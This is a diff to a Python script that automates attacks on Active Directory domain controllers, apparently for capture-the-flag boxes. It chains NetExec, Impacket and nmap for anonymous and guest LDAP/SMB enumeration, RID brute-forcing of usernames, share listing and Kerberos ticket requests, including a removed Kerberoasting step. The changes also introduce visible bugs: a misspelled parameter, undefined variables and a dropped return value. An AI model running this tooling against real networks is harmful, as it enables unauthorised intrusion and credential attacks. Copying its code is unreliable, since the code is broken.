@@ -20,9 +20,11 @@ USERS_FILE = "users.txt"
 # Centralized Status Printing 
 def print_status(message):
     """
-    Prints a status message with color only on the tag, not the whole line.
+    Prints a status message with colored tags.
+    
+    Supported tags: [+], [-], [!], [!!!], [*], [INFO]
+    Only the tags are colored, not the entire message.
     """
-    # Define colored tag replacements
     tag_colors = {
         "[+]": colored("[+]", "green"),
         "[-]": colored("[-]", "red"),
@@ -38,151 +40,171 @@ def print_status(message):
     print(f"{message}")
 
 def print_header(title):
-    """Prints a formatted section header."""
+    """Prints a formatted section header in magenta."""
     print(colored(f"\n\n{title}", "magenta"))
 
 
-def run_command(cmd_list_or_str, title, is_shell_command=False, capture_output=False):
+def run_command(cmd_list_or_str, title, is_shell_command=False, capture_output=False, retry_on_empty=False, retry_on_invalid=False, max_retries=2):
+    """
+    Execute a command with optional intelligent retry logic.
+    
+    Args:
+        cmd_list_or_str: Command as list (e.g., ["nxc", "smb", ip]) or string for shell commands
+        title: Description printed before command execution
+        is_shell_command: If True, execute as shell command (default: False)
+        capture_output: If True, return (output, returncode) tuple (default: False)
+        retry_on_empty: Retry if command returns completely empty output (default: False)
+        retry_on_invalid: Retry if output is empty, too short, or lacks success indicators (default: False)
+                         This is a superset of retry_on_empty - handles all empty cases plus validation
+        max_retries: Maximum number of attempts (default: 2)
+    
+    Returns:
+        If capture_output=True: tuple of (output_string, return_code)
+        If capture_output=False: tuple of (None, return_code)
+    
+    Retry Logic (when retry_on_invalid=True):
+        - Empty output → Retry
+        - Output < 50 chars → Retry (suspiciously short)
+        - No success indicators ([+], READ, WRITE, Authenticated, STATUS_SUCCESS, SidTypeUser) → Retry
+        - After max_retries attempts, returns whatever output was received
+    
+    Examples:
+        # Simple command, no retry
+        run_command(["nmap", "-sV", target], "Port scan")
+        
+        # SMB command with intelligent retry
+        run_command(["nxc", "smb", ip, "--shares"], "Enumerate shares", retry_on_invalid=True)
+        
+        # Capture output for parsing
+        output, rc = run_command(["nxc", "smb", ip], "SMB check", capture_output=True, retry_on_invalid=True)
+    """
     print(colored(f"\n{title}", "blue"))
 
     if isinstance(cmd_list_or_str, list):
-        cmd_str = " ".join(cmd_list_or_str)
+        # Create display string with proper quoting for empty strings
+        display_parts = []
+        for part in cmd_list_or_str:
+            if part == "":
+                display_parts.append("''")
+            elif " " in part:
+                display_parts.append(f"'{part}'")
+            else:
+                display_parts.append(part)
+        cmd_str = " ".join(display_parts)
     else:
         cmd_str = cmd_list_or_str
 
     print(colored(f"$ {cmd_str}", "white"))
 
-    result = subprocess.run(
-        cmd_list_or_str,
-        shell=is_shell_command,
-        capture_output=True,
-        text=True,
-        check=False  # Prevent crash on failure
-    )
+    attempt = 0
+    full_output = ""
+    result = None
+    
+    # Success indicators for SMB commands (when retry_on_invalid is True)
+    success_patterns = [
+        r'\[\+\]',           # Success tag
+        r'READ',             # Share permissions
+        r'WRITE',            # Share permissions
+        r'Authenticated',    # Auth success
+        r'STATUS_SUCCESS',   # Explicit success
+        r'SidTypeUser',      # RID brute results
+    ]
+    
+    while attempt < max_retries:
+        if attempt > 0:
+            print_status(f"[*] Retry attempt {attempt + 1}/{max_retries} (waiting 2 seconds)...")
+            time.sleep(2)  # Wait before retry
+        
+        result = subprocess.run(
+            cmd_list_or_str,
+            shell=is_shell_command,
+            capture_output=True,
+            text=True,
+            check=False  # Prevent crash on failure
+        )
 
-    full_output = result.stdout + result.stderr
+        full_output = result.stdout + result.stderr
 
-    def colorize_tags(line):
-        """Color only tags, not the whole line."""
-        tag_colors = {
-            r"\[\+\]": colored("[+]", "green"),
-            r"\[\-\]": colored("[-]", "red"),
-            r"\[\!\]": colored("[!]", "red"),
-            r"\[!!!\]": colored("[!!!]", "red"),
-            r"\[\*\]": colored("[*]", "blue"),
-            r"\[INFO\]": colored("[INFO]", "blue"),
-        }
-        for pattern, repl in tag_colors.items():
-            line = re.sub(pattern, repl, line)
-        return line
+        def colorize_tags(line):
+            """Color only tags, not the whole line."""
+            tag_colors = {
+                r"\[\+\]": colored("[+]", "green"),
+                r"\[\-\]": colored("[-]", "red"),
+                r"\[\!\]": colored("[!]", "red"),
+                r"\[!!!\]": colored("[!!!]", "red"),
+                r"\[\*\]": colored("[*]", "blue"),
+                r"\[INFO\]": colored("[INFO]", "blue"),
+            }
+            for pattern, repl in tag_colors.items():
+                line = re.sub(pattern, repl, line)
+            return line
 
-    for line in full_output.splitlines():
-        print(colorize_tags(line))
+        # Only print output on first attempt or if it's the last attempt
+        if attempt == 0 or attempt == max_retries - 1:
+            for line in full_output.splitlines():
+                print(colorize_tags(line))
 
+        # Check if we should retry
+        should_retry = False
+        
+        # Check for empty output
+        if retry_on_empty and not full_output.strip() and attempt < max_retries - 1:
+            should_retry = True
+            print_status("[!] Command returned empty output, retrying...")
+        
+        # Check for invalid/incomplete output (also checks for empty if retry_on_invalid is True)
+        if retry_on_invalid and attempt < max_retries - 1:
+            # Empty output is also invalid
+            if not full_output.strip():
+                should_retry = True
+                print_status("[!] Command returned empty output, retrying...")
+            else:
+                has_success_indicator = any(re.search(pattern, full_output, re.IGNORECASE) for pattern in success_patterns)
+                
+                # Check if output is suspiciously short (less than 50 chars, likely incomplete)
+                is_too_short = len(full_output.strip()) < 50
+                
+                # If no success indicators, the output might be wrong/incomplete
+                # OR if the output is suspiciously short
+                if not has_success_indicator or is_too_short:
+                    should_retry = True
+                    if is_too_short:
+                        print_status(f"[!] Command output suspiciously short ({len(full_output.strip())} chars), retrying...")
+                    else:
+                        print_status("[!] Command output appears incomplete (no success indicators), retrying...")
+        
+        if should_retry:
+            attempt += 1
+            continue
+        
+        # Success or final attempt - break the loop
+        break
+    
     if capture_output:
         return full_output, result.returncode
     else:
         return None, result.returncode
 
 
-def verify_credentials(r, username, password, fqdn=None, domain=None, timeout=20):
-    """
-    Kerberos-first credential verification.
-
-    Behavior:
-      - If fqdn+domain provided, run a GetUserSPNs.py probe first to detect NTLM-negotiation-failure
-        (which implies Kerberos-only). If probe indicates Kerberos, return "kerberos".
-      - If probe indicates explicit success -> return "ok".
-      - If probe indicates invalid creds -> return "bad".
-      - Otherwise fall back to nxc smb NTLM probe:
-          - explicit success: "ok"
-          - explicit logon failure: "bad"
-          - Kerberos/negotiation hints: "kerberos"
-          - ambiguous/no output: "ambiguous"
-      - If username/password not provided: "no-creds"
-
-    Return values: "kerberos", "ok", "bad", "ambiguous", "no-creds"
-    """
-    if not username or not password:
-        return "no-creds"
-
-    print_status("\n[*] Verifying provided credentials before continuing...")
-
-    # Kerberos-capable probe using GetUserSPNs.py when we have fqdn+domain
-    if fqdn and domain:
-        try:
-            krb_cmd = [
-                "GetUserSPNs.py",
-                f"{domain}/{username}:{password}",
-                "-request",
-                "-dc-host",
-                fqdn
-            ]
-            out, rc = run_command(krb_cmd, "Kerberos-capable probe (GetUserSPNs.py)", capture_output=True)
-            text = (out or "").strip()
-
-            if text:
-                # If the Impacket message says NTLM negotiation failed -> Kerberos needed
-                if re.search(r'NTLM negotiation failed|NTLM is disabled|Try to use Kerberos|invalidCredentials', text, re.IGNORECASE):
-                    print_status("\n[!] KERBEROS RERUN DETECTED: NTLM negotiation failed (GetUserSPNs probe).")
-                    return "kerberos"
-
-                # If GetUserSPNs shows explicit success or ticket-related output -> OK
-                if re.search(r'\[\+\]|Authenticated|Requested TGS|TGS issued|Ticket', text, re.IGNORECASE):
-                    print_status("\n[+] GetUserSPNs probe shows success/response — credentials look OK.")
-                    return "ok"
-
-                # If GetUserSPNs returned explicit invalid credentials -> bad
-                if re.search(r'invalidCredentials|STATUS_LOGON_FAILURE|NT_STATUS_LOGON_FAILURE', text, re.IGNORECASE):
-                    print_status("\n[-] GetUserSPNs probe indicates credentials are invalid (invalidCredentials / STATUS_LOGON_FAILURE).")
-                    return "bad"
-
-                # Ambiguous from GetUserSPNs -> fall through to SMB check
-                print_status("\n[!] GetUserSPNs probe ambiguous — falling back to NTLM-style SMB probe.")
-            else:
-                print_status("\n[!] GetUserSPNs produced no useful output — falling back to NTLM-style SMB probe.")
-        except Exception as e:
-            print_status(f"\n[!] Failed to run GetUserSPNs probe: {e}. Falling back to NTLM-style SMB probe.")
-
-    # Fallback: run nxc smb check
-    try:
-        smb_cmd = ["nxc", "smb", r, "-u", username, "-p", password, "--shares"]
-        out, rc = run_command(smb_cmd, "Verify provided credentials (nxc smb check)", capture_output=True)
-        text = (out or "").strip()
-
-        if not text:
-            print_status("\n[-] No output from nxc smb probe; treating as ambiguous.")
-            return "ambiguous"
-
-        # explicit failures
-        if re.search(r'STATUS_ACCESS_DENIED|STATUS_LOGON_FAILURE|NT_STATUS_LOGON_FAILURE|authentication failed', text, re.IGNORECASE):
-            print_status("\n[-] Provided credentials failed SMB authentication.")
-            return "bad"
-
-        # explicit success markers
-        if re.search(r'\[\+\]|Authenticated|STATUS_SUCCESS', text, re.IGNORECASE):
-            print_status("\n[+] Credentials validated (SMB authentication succeeded).")
-            return "ok"
-
-        # Kerberos / negotiation hints in SMB output
-        if re.search(r'STATUS_NOT_SUPPORTED|KDC_ERR|SPNEGO|NTLM negotiation failed', text, re.IGNORECASE):
-            print_status("\n[+] Kerberos/negotiation detected in SMB output — recommend Kerberos flows.")
-            return "kerberos"
-
-        
-        # ambiguous but non-empty output
-        print_status("\n[!] Credential verification returned ambiguous result; treating as ambiguous.")
-        return "ambiguous"
-
-    except Exception as e:
-        print_status(f"\n[!] Exception during SMB credential probe: {e}")
-        return "ambiguous"
-
-
-
 # Check Dependencies 
-def check_dependencies(is_kerberos=False):
-    """Checks for necessary external tools and exits if missing."""
+def check_dependencies():
+    """
+    Check for required external tools and exit if any are missing.
+    
+    Args:
+        kerberos: Currently unused (kept for compatibility)
+    
+    Required tools:
+        - nmap: Network scanning
+        - nxc (NetExec): SMB/LDAP enumeration
+        - certipy: ADCS enumeration
+        - bloodhound-ce-python: BloodHound data collection
+        - bloodyAD: Permission checking
+        - Impacket scripts: GetNPUsers.py, getTGT.py, GetUserSPNs.py
+    
+    Exits:
+        Exits with code 1 if any dependencies are missing, printing installation instructions
+    """
     print_header("\nChecking external dependencies")
 
     # Map all dependencies to a display name and a unique key for installation
@@ -238,19 +260,29 @@ def check_dependencies(is_kerberos=False):
     return True
 
 
-def check_host_nmap(r, use_pn_fallback=True):
+def check_host_nmap(r, suse_pn_fallback=True):
     """
-    Accurate liveness check for a target host.
-    - Uses ICMP first.
-    - Optionally tries -Pn, but will *not* mark host as 'up' unless verified by response.
+    Check if target host is active using nmap and ping.
+    
+    Args:
+        r: Target IP address
+        use_pn_fallback: Currently unused (kept for compatibility)
+    
+    Returns:
+        bool: True if host is up, False otherwise
+    
+    Method:
+        1. Try ICMP echo with nmap (-PE -sn -n)
+        2. Fallback to direct ping if nmap doesn't confirm
     """
+
     print_header(f"Checking if host {r} is active with nmap")
 
     def run_nmap(args):
         result = subprocess.run(args, capture_output=True, text=True)
         return result.stdout.strip()
 
-    # --- ICMP echo request only ---
+    # ICMP echo request with nmap
     command = ["sudo", "nmap", "-PE", "-sn", "-n", r]
     output = run_nmap(command)
 
@@ -258,24 +290,37 @@ def check_host_nmap(r, use_pn_fallback=True):
         print_status(f"[+] Host {r} is active (nmap confirmed).")
         return True
 
-    # --- ICMP ping fallback ---
+    # Ping fallback
     ping = subprocess.run(["ping", "-c", "1", "-W", "2", r], capture_output=True, text=True)
     if "1 received" in ping.stdout or "bytes from" in ping.stdout:
         print_status(f"[+] Host {r} is active (confirmed via ping fallback).")
         return True
+    
     return False
+
 
 
 def ensure_hosts_entry(ip, fqdn, domain):
     """
-    Ensures /etc/hosts maps <domain> (and fqdn) to ip.
-    - If domain exists with same IP -> no change
-    - If domain exists with different IP -> remove and add correct mapping
-    - If domain not present -> append new mapping
-    Always displays /etc/hosts afterward.
+    Ensure /etc/hosts maps domain and FQDN to the correct IP.
+    
+    Args:
+        ip: Target IP address
+        fqdn: Fully qualified domain name (e.g., dc01.corp.local)
+        domain: Domain name (e.g., corp.local)
+    
+    Returns:
+        bool: True if modifications were made, False otherwise
+    
+    Behavior:
+        - If domain maps to same IP: no change
+        - If domain maps to different IP: remove old entry and add new one
+        - If domain not present: add new entry
+        - Always displays /etc/hosts content afterward
     """
     hosts_path = "/etc/hosts"
     domain_esc = re.escape(domain)
+    
 
     # Read /etc/hosts (safe to read as non-root)
     try:
@@ -330,6 +375,174 @@ def ensure_hosts_entry(ip, fqdn, domain):
     # Always show current /etc/hosts contents
     run_command("cat /etc/hosts", "Current /etc/hosts contents", is_shell_command=True)
     return modified
+
+
+
+def domain_discovery(r):
+    """
+    Performs anonymous LDAP enumeration to discover the domain and FQDN.
+
+    This function runs an anonymous query against the target's LDAP service
+    to automatically determine the domain controller's name and the domain it
+    belongs to. If successful, it constructs the Fully Qualified Domain Name
+    (FQDN) and calls `ensure_hosts_entry` to update the local /etc/hosts file.
+
+    Args:
+        r (str): The target IP address of the domain controller.
+
+    Returns:
+        tuple: A tuple containing (discovered_domain, discovered_fqdn).
+            - discovered_domain (str or None): The discovered domain name
+              (e.g., "corp.local"), or None if parsing fails.
+            - discovered_fqdn (str or None): The discovered FQDN
+              (e.g., "dc01.corp.local"), or None if parsing fails.
+    """
+    
+    domain_art = r"""Domain Discovery
+*  **  ** *  *  
+ **  *     *  * 
+         *  *  *
+   *            
+         *      
+          *     
+* *    *        
+     *      **  
+ *         *    
+                
+               *
+    *   *     * """
+
+    print_header(domain_art)
+
+    discovered_domain = None
+    discovered_fqdn = None
+    needs_kerberos_rerun = False 
+
+    # Query LDAP anonymously to discover domain info 
+    anon_user = ""
+    anon_pass = ""
+    nxc_list = ["nxc", "ldap", r, "-u", anon_user, "-p", anon_pass]
+    nxc_output, _ = run_command(nxc_list, "Get domain name via anonymous LDAP", capture_output=True, retry_on_invalid=True)
+
+    if nxc_output and nxc_output.strip():
+        print_status("[*] Received LDAP output (excerpt):")
+        for ln in nxc_output.splitlines()[:10]:
+            print_status(ln)
+            if needs_kerberos_rerun and (not u.strip() or not p.strip()):
+                print_status("[-] Kerberos authentication requires valid credentials (-u and -p).")
+                print_status("[-] Please rerun with:")
+                print(colored("    python script.py -r <box-ip> -u <user> -p <password>", "yellow"))
+                sys.exit(1)
+
+
+        match = re.search(r"\(name:(?P<name>[^)]+)\)\s*\(domain:(?P<domain>[^)]+)\)", nxc_output)
+        if match:
+            dc_name = match.group("name")
+            discovered_domain = match.group("domain")
+            discovered_fqdn = f"{dc_name}.{discovered_domain}"
+            print_status(f"[+] Parsed FQDN: {discovered_fqdn}")
+            ensure_hosts_entry(r, discovered_fqdn, discovered_domain)
+        else:
+            print_status("[!] Could not parse FQDN/Domain information from LDAP output.")
+            
+    else:
+        print_status("[!] No LDAP response from anonymous query; skipping host mapping.")
+
+    return discovered_domain, discovered_fqdn
+
+
+def verify_credentials(r, username, password, fqdn, domain, timeout=20):
+    """
+    Verify credentials via SMB authentication check.
+    
+    Args:
+        r: Target IP address
+        username: Username to verify
+        password: Password to verify
+        fqdn: Not used (kept for compatibility)
+        domain: Not used (kept for compatibility)
+        timeout: Not used (kept for compatibility)
+    
+    Returns:
+        str: Status of credential verification
+            - "no-creds": No username/password provided
+            - "ok": Credentials valid
+            - "bad": Credentials invalid
+            - "kerberos": Kerberos-only environment detected
+            - "ambiguous": Unable to determine status
+    
+    Behavior:
+        Runs silent nxc SMB check and interprets output:
+        - STATUS_LOGON_FAILURE → "bad"
+        - Authenticated/STATUS_SUCCESS → "ok"
+        - STATUS_NOT_SUPPORTED/NTLM negotiation failed → "kerberos"
+        - Empty or unclear output → "ambiguous"
+    """
+
+
+    if not username or not password:
+        return "no-creds"
+
+    print_status("\n[*] Verifying provided credentials before continuing...")
+
+    # Fallback: run nxc smb check (silent)
+    try:
+        smb_cmd = ["nxc", "smb", r, "-u", username, "-p", password, "--shares"]
+        result = subprocess.run(smb_cmd, capture_output=True, text=True, check=False)
+        text = (result.stdout + result.stderr).strip()
+        
+        if "STATUS_NOT_SUPPORTED" in text:
+            kerberos_art = r"""888  /                    888                                        
+888 /     e88~~8e  888-~\ 888-~88e   e88~~8e  888-~\  e88~-_   d88~\ 
+888/\    d888  88b 888    888  888b d888  88b 888    d888   i C888   
+888  \   8888__888 888    888  8888 8888__888 888    8888   |  Y88b  
+888   \  Y888    , 888    888  888P Y888    , 888    Y888   '   888D 
+888    \  "88___/  888    888-_88"   "88___/  888     "88_-~  \_88P  
+                                                                     """
+            
+            detected_art = r"""888~-_               d8                       d8                   888 
+888   \   e88~~8e  _d88__  e88~~8e   e88~~\ _d88__  e88~~8e   e88~\888 
+888    | d888  88b  888   d888  88b d888     888   d888  88b d888  888 
+888    | 8888__888  888   8888__888 8888     888   8888__888 8888  888 
+888   /  Y888    ,  888   Y888    , Y888     888   Y888    , Y888  888 
+888_-~    "88___/   "88_/  "88___/   "88__/  "88_/  "88___/   "88_/888 
+                                                                       """
+
+            print_header(f"{kerberos_art}")
+            print_header(f"{detected_art}")
+            print_status("\n[!] Kerberos Detected: STATUS_NOT_SUPPORTED in anonymous LDAP check.")
+            needs_rerun_from_creds = True
+        if not text:
+            print_status("[-] No output from nxc smb probe; treating as ambiguous.")
+            return "ambiguous"
+
+        # explicit failures
+        if re.search(r'STATUS_ACCESS_DENIED|STATUS_LOGON_FAILURE|NT_STATUS_LOGON_FAILURE|authentication failed', text, re.IGNORECASE):
+            print_status("[-] Provided credentials failed SMB authentication.")
+            return "bad"
+
+        # explicit success markers
+        if re.search(r'\[\+\]|Authenticated|STATUS_SUCCESS', text, re.IGNORECASE):
+            print_status("[+] Credentials validated (SMB authentication succeeded).")
+            return "ok"
+
+        # Kerberos / negotiation hints in SMB output
+        if re.search(r'STATUS_NOT_SUPPORTED|KDC_ERR|SPNEGO|NTLM negotiation failed', text, re.IGNORECASE):
+            print_status("[+] Kerberos/negotiation detected in SMB output — recommend Kerberos flows.")
+            return "kerberos"
+
+        
+        # ambiguous but non-empty output - show why
+        print_status("[!] Credential verification returned ambiguous result.")
+        print_status("[!] Reason: Output contained no clear success or failure indicators")
+        print_status("[!] Output excerpt (first 200 chars):")
+        print_status(f"    {text[:200]}")
+        return "ambiguous"
+
+
+    except Exception as e:
+        print_status(f"[!] Exception during SMB credential probe: {e}")
+        return "ambiguous"
 
 
 def update_users_file(new_unique, USERS_FILE, print_status_func):
@@ -403,7 +616,7 @@ def update_users_file(new_unique, USERS_FILE, print_status_func):
         if not file_exists:
             print_status_func(f"[*] No new usernames to write; {USERS_FILE} not created.")
         else:
-            print_status_func(f"[*] {USERS_FILE} already up-to-date ({len(existing_usernames)} users). No originals added.")
+            print_status_func(f"[*] {USERS_FILE} already up-to-date. No originals added.")
 
 
     # Ensure every username has a lowercase entry (append missing lowercase lines only)
@@ -448,86 +661,42 @@ def update_users_file(new_unique, USERS_FILE, print_status_func):
         print_status_func(f"[-] Error ensuring lowercase entries in {USERS_FILE}: {e}")
 
 
-def section_1_ldap_discovery(r, u, p, k):
+def ldap_enumeration(r, u, p, k):
     """
-    LDAP discovery that returns (discovered_domain, discovered_fqdn, needs_kerberos_rerun).
-    Runs the description extraction pipeline once and the username extraction once.
+    Perform LDAP enumeration to discover domain information and usernames.
+    
+    Args:
+        r: Target IP address
+        u: Username (empty string for anonymous)
+        p: Password (empty string for anonymous)
+        k: Boolean indicating if Kerberos authentication should be used
+    
+    Returns:
+        tuple: (discovered_domain, discovered_fqdn, needs_kerberos_rerun)
+            - discovered_domain: Domain name (e.g., "CORP.LOCAL") or None
+            - discovered_fqdn: Full DC name (e.g., "DC01.CORP.LOCAL") or None
+            - needs_kerberos_rerun: True if Kerberos-only environment detected
+    
+    Actions:
+        1. Anonymous LDAP query to discover domain/FQDN
+        2. Extract user descriptions from LDAP
+        3. Extract usernames and update users.txt file
     """
-    ldap_art = r"""LDAP Enumeration & Domain Discovery
- **  *   * * *   * *  **  ** *  *  
-*  *  * * *   **    **  *     *  * 
-       *    *               *  *  *
-  *        *          *            
-                            *      
-*           *                *     
- *     **          * *    *        
-     **  *     *        *      **  
-              *     *         *    
-   *                               
-                                  *
-          *  *         *   *     * """
+    ldap_art = r"""LDAP Enumeration
+ **  *   * * *  
+*  *  * * *   **
+       *    *   
+  *        *    
+                
+*           *   
+ *     **       
+     **  *     *
+              * 
+   *            
+                
+          *  *  """
 
     print_header(ldap_art)
-
-    discovered_domain = None
-    discovered_fqdn = None
-    needs_kerberos_rerun = False 
-
-    # Query LDAP anonymously to discover domain info 
-    anon_user = ""
-    anon_pass = ""
-    nxc_list = ["nxc", "ldap", r, "-u", anon_user, "-p", anon_pass]
-    # print_status(f"[*] Running anonymous LDAP check: $ {' '.join([a if a else '\"\"' for a in nxc_list])}")
-
-    nxc_output, _ = run_command(nxc_list, "Get domain name via anonymous LDAP", capture_output=True)
-
-    if nxc_output and nxc_output.strip():
-        print_status("[*] Received LDAP output (excerpt):")
-        for ln in nxc_output.splitlines()[:10]:
-            print_status(ln)
-
-        if "STATUS_NOT_SUPPORTED" in nxc_output:
-            kerberos_art = r"""888  /                    888                                        
-888 /     e88~~8e  888-~\ 888-~88e   e88~~8e  888-~\  e88~-_   d88~\ 
-888/\    d888  88b 888    888  888b d888  88b 888    d888   i C888   
-888  \   8888__888 888    888  8888 8888__888 888    8888   |  Y88b  
-888   \  Y888    , 888    888  888P Y888    , 888    Y888   '   888D 
-888    \  "88___/  888    888-_88"   "88___/  888     "88_-~  \_88P  
-                                                                     """
-            
-            detected_art = r"""888~-_               d8                       d8                   888 
-888   \   e88~~8e  _d88__  e88~~8e   e88~~\ _d88__  e88~~8e   e88~\888 
-888    | d888  88b  888   d888  88b d888     888   d888  88b d888  888 
-888    | 8888__888  888   8888__888 8888     888   8888__888 8888  888 
-888   /  Y888    ,  888   Y888    , Y888     888   Y888    , Y888  888 
-888_-~    "88___/   "88_/  "88___/   "88__/  "88_/  "88___/   "88_/888 
-                                                                       """
-
-
-            print_header(f"{kerberos_art}")
-            print_header(f"{detected_art}")
-            print_status("\n[!] Kerberos Detected: STATUS_NOT_SUPPORTED in anonymous LDAP check.")
-            needs_kerberos_rerun = True
-            if needs_kerberos_rerun and (not u.strip() or not p.strip()):
-                print_status("[-] Kerberos authentication requires valid credentials (-u and -p).")
-                print_status("[-] Please rerun with:")
-                print(colored("    python script.py -r <box-ip> -u <user> -p <password>", "yellow"))
-                sys.exit(1)
-
-
-        match = re.search(r"\(name:(?P<name>[^)]+)\)\s*\(domain:(?P<domain>[^)]+)\)", nxc_output)
-        if match:
-            dc_name = match.group("name")
-            discovered_domain = match.group("domain")
-            discovered_fqdn = f"{dc_name}.{discovered_domain}"
-            print_status(f"[+] Parsed FQDN: {discovered_fqdn}")
-            ensure_hosts_entry(r, discovered_fqdn, discovered_domain)
-        else:
-            print_status("[!] Could not parse FQDN/Domain information from LDAP output.")
-            
-    else:
-        print_status("[!] No LDAP response from anonymous query; skipping host mapping.")
-
 
     # Enumerate user descriptions and collect usernames
     awk_script = r"""/description/{desc=substr($0,index($0,$6));valid=(desc!~/Built-in account for guest access to the computer\/domain/)} /sAMAccountName/&&valid{ if(!seen[$6]++){ printf "[+]Description: %-30s User: %s\n", desc, $6 } valid=0 }"""
@@ -577,9 +746,6 @@ def section_1_ldap_discovery(r, u, p, k):
     else:
         print_status("[*] No usernames discovered via LDAP username extraction.")
 
-    # The return statement stays the same
-    return discovered_domain, discovered_fqdn, needs_kerberos_rerun
-
 
 def create_users_from_nxc(
     r,
@@ -591,13 +757,29 @@ def create_users_from_nxc(
     fqdn=None,
 ):
     """
-    Run nxc rid-brute and parse usernames from output.
-    Auth priority:
-        1. Kerberos (if kerberos=True)
-        2. Authenticated user/pass (if username/password provided)
-        3. Anonymous → Guest fallback (if neither)
-    Updates USERS_FILE via update_users_file().
-    Returns True if any usernames were added/merged, False otherwise.
+    Perform RID brute-force to enumerate usernames and update users.txt.
+    
+    Args:
+        r: Target IP address
+        USERS_FILE: Path to output file for discovered usernames
+        debug_log: Path to save raw nxc output for debugging
+        username: Username for authenticated enumeration (None for anonymous)
+        password: Password for authenticated enumeration (None for anonymous)
+        kerberos: If True, use Kerberos authentication
+        fqdn: Fully qualified domain name (required for Kerberos)
+    
+    Returns:
+        bool: True if usernames were discovered and added, False otherwise
+    
+    Authentication priority:
+        1. Kerberos (if kerberos=True and fqdn provided)
+        2. Authenticated (if username/password provided)
+        3. Anonymous, with Guest fallback
+    
+    Notes:
+        - Brutes RIDs up to 5000
+        - Case-preserving username deduplication
+        - Updates users.txt via update_users_file()
     """
     abs_users = os.path.abspath(USERS_FILE)
 
@@ -651,34 +833,35 @@ def create_users_from_nxc(
 
     users = []
 
-    # --- Kerberos mode ---
+    # Kerberos mode
     if kerberos and fqdn:
         cmd = ["nxc", "smb", fqdn, "--rid-brute", "5000", "-k"]
         if username and password:
             cmd += ["-u", username, "-p", password]
         label = "RID Brute-Force (Kerberos)"
         print_status(f"[+] {label}")
-        result = run_command(cmd, label, capture_output=True)
+        result = run_command(cmd, label, capture_output=True, retry_on_invalid=True)
         output = normalize_result(result)
         users = parse_users(output)
 
-    # --- Authenticated mode ---
+    # Authenticated mode
     elif username and password:
         cmd = ["nxc", "smb", r, "-u", username, "-p", password, "--rid-brute", "5000"]
         label = f"RID Brute-Force (Authenticated as {username})"
         print_status(f"[+] {label}")
-        result = run_command(cmd, label, capture_output=True)
+        result = run_command(cmd, label, capture_output=True, retry_on_invalid=True)
         output = normalize_result(result)
         users = parse_users(output)
 
-    # --- Anonymous/Guest mode ---
+    # Anonymous/Guest mode
     else:
         # Try anonymous first
-        print_status(f"[+] No credentials provided — attempting Anonymous RID brute")
+        print_status(f"\n[+] No credentials provided — attempting Anonymous RID brute")
         result = run_command(
             ["nxc", "smb", r, "-u", "anonymous", "-p", "", "--rid-brute", "5000"],
             "RID Brute-Force (Anonymous)",
             capture_output=True,
+            retry_on_invalid=True
         )
         output = normalize_result(result)
         users = parse_users(output)
@@ -690,6 +873,7 @@ def create_users_from_nxc(
                 ["nxc", "smb", r, "-u", "guest", "-p", "", "--rid-brute", "5000"],
                 "RID Brute-Force (Guest)",
                 capture_output=True,
+                retry_on_invalid=True
             )
             output = normalize_result(result)
             users = parse_users(output)
@@ -712,9 +896,7 @@ def create_users_from_nxc(
     return True
 
 
-
-
-def section_2_smb_enum(r, f, d, u, p, k):
+def smb_enum(r, f, d, u, p, k):
     smb_art = r"""SMB Enumeration
   * *   * * *  
  *   * * *   **
@@ -746,49 +928,68 @@ def section_2_smb_enum(r, f, d, u, p, k):
         if k and f and d:
             ccache_file = f"{u}.ccache"
 
-            # NXC Kerberos Share Enumeration (using FQDN)
-            run_command(["nxc", "smb", f, "-u", u, "-p", p, "-k", "--shares"], "Enumerate SMB shares (Kerberos with nxc)")
-
-            # Get Kerberos TGT (This tool requires the password, but FQDN positional argument is REMOVED)
-            # 2) Try to obtain a TGT with getTGT.py 
+            # Get Kerberos TGT FIRST (This tool requires the password, but FQDN positional argument is REMOVED)
             run_command(["getTGT.py", f"{d}/{u}:{p}", "-k", "-dc-ip", r], "Get Kerberos TGT with getTGT.py")
 
-            # 3) If getTGT.py produced a cache file, export it in this script's environment
+            # Wait briefly and verify the cache file exists before proceeding
+            max_wait = 5  # seconds
+            wait_interval = 0.5
+            elapsed = 0
+            while not os.path.exists(ccache_file) and elapsed < max_wait:
+                time.sleep(wait_interval)
+                elapsed += wait_interval
+            
             if os.path.exists(ccache_file):
                 os.environ["KRB5CCNAME"] = ccache_file
                 print_status(f"[+] Found TGT cache {ccache_file} and exported KRB5CCNAME.")
+                
+                # Small additional delay to ensure file is fully written
+                time.sleep(0.5)
+                
+                # NOW run NXC Kerberos Share Enumeration (using FQDN) with the ticket ready - with intelligent retry
+                run_command(["nxc", "smb", f, "-u", u, "-p", p, "-k", "--shares"], 
+                           "Enumerate SMB shares (Kerberos with nxc)", retry_on_invalid=True)
+                
                 cmd_str = f"KRB5CCNAME={ccache_file} smbclient.py -k {f}"
                 print(colored(f"\nConnect to SMB using Kerberos ticket", 'blue'))
-                print_status(f"[+] EXECUTABLE COMMAND: {cmd_str}")
-                print_status("[*] Note: You can run the command above in a shell, or subsequent run_command() calls in this script will inherit KRB5CCNAME.")
+                print(colored(f"\n{'='*60}", 'yellow'))
+                print(colored(f"  MANUAL SMB CONNECTION COMMAND", 'yellow'))
+                print(colored(f"  {cmd_str}", 'yellow'))
+                print(colored(f"{'='*60}", 'yellow'))                
+                print_status("[*] Kerberos ticket is now active for this script's remaining commands.")
+                print_status("[*] To use manually in your shell, run the command shown above.")
             else:
-                print_status(f"[-] ERROR: Kerberos ticket file '{ccache_file}' not found after getTGT.py.")
+                print_status(f"[-] ERROR: Kerberos ticket file '{ccache_file}' not found after getTGT.py (waited {max_wait}s).")
             
             # Always try to refresh/merge usernames from RID brute (merge only adds new users)
             print_status(f"\n[*] Ensuring {USERS_FILE} is up-to-date via nxc RID-brute (may merge new names).")
             create_users_from_nxc(r, username=u, password=p, kerberos=True, fqdn=f)
         else:
             # NTLM/Kerberos Authenticated Checks (Uses IP address)
-            run_command(["nxc", "smb", r] + auth_opts + ["--shares"], "Enumerate SMB shares (Authenticated)")
+            run_command(["nxc", "smb", r] + auth_opts + ["--shares"], 
+                       "Enumerate SMB shares (Authenticated)", retry_on_invalid=True)
             create_users_from_nxc(r, username=u, password=p)
 
     # Anonymous/Guest Path (ONLY runs if NO credentials were provided) 
     else:
         print_status("\n[*] Running initial Anonymous/Guest checks...")
-        print_status("[*] Note: when running manually use -p ''")
 
-        # Anonymous Shares (no extra quotes)
+        # Anonymous Shares (no extra quotes) - with intelligent retry
         run_command(["nxc", "smb", r, "-u", "anonymous", "-p", "", "--shares"],
-                    "Enumerate SMB shares (Anonymous) ")
